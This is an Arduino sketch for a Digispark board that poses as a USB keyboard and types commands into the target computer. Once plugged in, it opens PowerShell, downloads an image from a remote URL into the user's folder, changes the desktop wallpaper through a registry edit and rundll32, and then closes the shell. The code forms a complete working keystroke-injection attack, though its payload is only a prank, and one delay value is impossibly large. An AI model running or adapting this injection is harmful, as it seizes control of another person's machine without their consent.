#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
}


void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  
  
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_I);
  DigiKeyboard.delay(700);

  // Here's the pic file btw
  DigiKeyboard.print("Invoke-WebRequest -Uri \"http://i.ytimg.com/vi/7o8xaS7FWOA/maxresdefault.jpg\" -OutFile \"C:\\Users\\$env:username\\photo.jpg\"");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1250);
 
  DigiKeyboard.print("Function Set-WallPaper($Value)");
  DigiKeyboard.print("\n {\n  Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $value; \n rundll32.exe user32.dll, UpdatePerUserSystemParameters; \n }");
  DigiKeyboard.delay(900);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  SetPhotoToDesktop();


  
  ExitShell();
  
  DigiKeyboard.delay(1000000000000000000000000000000000000000000000);
}

void SetPhotoToDesktop()
{

  DigiKeyboard.delay(500);

  DigiKeyboard.print("Set-WallPaper -value \"C:\\Users\\$env:username\\photo.jpg\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void ExitShell()
{
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


  
